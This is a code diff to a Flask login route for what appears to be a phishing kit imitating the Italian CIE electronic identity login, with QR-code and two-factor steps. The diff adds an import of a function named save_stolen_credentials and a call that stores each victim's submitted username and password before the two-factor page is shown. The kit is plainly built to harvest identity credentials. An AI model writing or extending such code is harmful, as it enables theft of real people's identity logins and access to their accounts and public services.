@@ -1,7 +1,8 @@
-from flask import current_app, flash, render_template, request, redirect, session, url_for
+from flask import current_app, render_template, request, redirect, session, url_for
 from .. import auth
 from ..services.cie import access_login_page, get_new_qr_code, submit_credentials
 from ..services.flow import save_flow, check_login_flow
+from ..services.utils.writer import save_stolen_credentials
 
 DEFAULT_ERROR = {"title": "Error", "message": "An unexpected error occurred. Please try again later"}
 
@@ -46,6 +47,10 @@ def cie_login_credentials():
             session["cie_login_error"] = error
             current_app.logger.warning(f"CIE login flow failed: {error}")
             return redirect(url_for("auth.cie_login"))
+
+        if not login_flow.username or not login_flow.password:
+            raise ValueError("Username or password is not set in the login flow")
+        save_stolen_credentials(login_flow.username, login_flow.password)
 
         current_app.logger.info("CIE login flow executed successfully")
         return render_template("cie_2fa.html"), 200
